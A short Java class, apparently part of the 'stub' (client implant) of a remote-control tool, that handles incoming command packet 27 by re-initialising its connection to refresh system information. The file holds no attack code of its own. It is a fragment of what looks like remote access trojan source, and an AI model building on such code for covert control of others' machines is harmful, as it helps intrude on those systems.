package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.Connection;

public class Packet27RefreshSystemInfo extends AbstractIncomingPacket{

	@Override
	public void read() throws Exception {
		Connection.initialize();
	}

}
